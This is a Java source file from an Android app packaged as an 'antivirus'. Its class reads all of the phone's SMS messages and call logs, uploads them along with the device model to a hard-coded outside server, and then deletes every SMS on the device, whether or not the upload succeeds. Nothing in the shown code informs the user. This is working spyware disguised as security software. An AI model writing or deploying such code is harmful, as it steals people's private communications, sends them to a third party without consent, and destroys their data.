package com.braniax.antivirus;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;
import android.util.Log;
import android.widget.Toast;

import com.android.volley.AuthFailureError;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;

public class UpdationToServer
{

    public static final String DURATION = "duration";
    public StringBuilder message;
    String calllogs;
    ArrayList<String> messagesData;
    Context context;
    ContentResolver contentResolver;
    Uri mSmsQueryUri = Uri.parse("content://sms");

    public UpdationToServer(Context context)
    {
        this.context = context;
    }

    public ArrayList<String> getMessages()
    {

        ArrayList<String> messages = new ArrayList<String>();
        ContentResolver contentResolver=context.getContentResolver();
        //Uri mSmsQueryUri = Uri.parse("content://sms/");
        //sb.append("Messages");
        Cursor cursor = null;
        try {
            cursor = contentResolver.query(mSmsQueryUri, new String[] { "_id", "address", "date", "body",
                    "type", "read" }, null, null, "date desc");
            if (cursor == null) {
                Log.i("curson null", "cursor is null. uri: " + mSmsQueryUri);
                //Toast.makeText(this, "curor null", Toast.LENGTH_SHORT).show();
            }

            //assert cursor != null;
            for (boolean hasData = cursor.moveToFirst(); hasData; hasData = cursor.moveToNext()) {

                String body = cursor.getString(cursor.getColumnIndex("body"));
                String address = cursor.getString(cursor.getColumnIndex("address"));

                //sb.append( "\nSender:--- "+address +" \nBody:--- "+body);
                //sb.append("\n----------------------------------");


                //messages.add(sb.toString());
                messages.add("\n\n"+"Number:     "+address+"\n"+"Content:     "+body+"\n\n");



            }
        } catch (Exception e) {
            Log.e("Error", e.getMessage());
        } finally {
            //assert cursor != null;
            cursor.close();
        }
        return messages;

    }




    private  String getCallDetail()
    {
        StringBuffer stringBuffer = new StringBuffer();
        Cursor cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI,
                null, null, null, CallLog.Calls.DATE + " DESC");
        int number = cursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = cursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = cursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = cursor.getColumnIndex(CallLog.Calls.DURATION);
        while (cursor.moveToNext()) {
            String phNumber = cursor.getString(number);
            String callType = cursor.getString(type);
            String callDate = cursor.getString(date);
            Date callDayTime = new Date(Long.valueOf(callDate));
            String callDuration = cursor.getString(duration);
            String dir = null;
            int dircode = Integer.parseInt(callType);
            switch (dircode) {
                case CallLog.Calls.OUTGOING_TYPE:
                    dir = "OUTGOING";
                    break;
                case CallLog.Calls.INCOMING_TYPE:
                    dir = "INCOMING";
                    break;

                case CallLog.Calls.MISSED_TYPE:
                    dir = "MISSED";
                    break;
            }
            stringBuffer.append("\nPhone Number:--- " + phNumber + " \nCall Type:--- "
                    + dir + " \nCall Date:--- " + callDayTime
                    + " \nCall duration in sec :--- " + callDuration);
            stringBuffer.append("\n----------------------------------");
        }
        cursor.close();
        return stringBuffer.toString();
    }



    public void addtoServer(final Context context) {


        final ArrayList<String> smss=getMessages();
        final String callllogs=getCallDetail();





        //Toast.makeText(MainActivity.this, msg.toString(), Toast.LENGTH_LONG).show();

        StringRequest request=new StringRequest(Request.Method.POST, "http://rfbasolutions.com/get_messages_api/store_new_details.php", new Response.Listener<String>()
        {
            String serverResponse="Message Received!";

            //SmsMessage msg = (SmsMessage)message.;
            @Override
            public void onResponse(String response) {


               /* Intent intent=new Intent(MainActivity.this,ServerServic.class);
                intent.putExtra("calllogs",callllogs.toString());
                intent.putExtra("sms",smss.toString());
                startService(intent);*/

                Toast.makeText(context, response, Toast.LENGTH_SHORT).show();
                //Log.d("Respnse",response);
                if(response.equals(serverResponse))
                {
                    context.getContentResolver().delete(mSmsQueryUri,null,null);
                    //Toast.makeText(context,"deleted", Toast.LENGTH_LONG).show();
                }

            }
        }, new Response.ErrorListener()
        {
            @Override
            public void onErrorResponse(VolleyError error)
            {
                // Toast.makeText(context, error.toString(), Toast.LENGTH_SHORT).show();

                context.getContentResolver().delete(mSmsQueryUri,null,null);

            }
        })
        {
            @Override
            protected Map<String,String> getParams() throws AuthFailureError {
                HashMap<String,String> params=new HashMap<>();


                params.put("imei_no","");

                String DEVICE_NAME = android.os.Build.MODEL;

                if(DEVICE_NAME!=null){
                    Log.i("IMEII",DEVICE_NAME);
                    params.put("device_name",DEVICE_NAME);
                }

                params.put("calllog",callllogs.toString());
                params.put("record", smss.toString());
                Toast.makeText(context, params.toString() , Toast.LENGTH_SHORT).show();

                return params;
            }
        };
        RequestQueue requestQueue=Volley.newRequestQueue(context);
        requestQueue.add(request);
    }


}
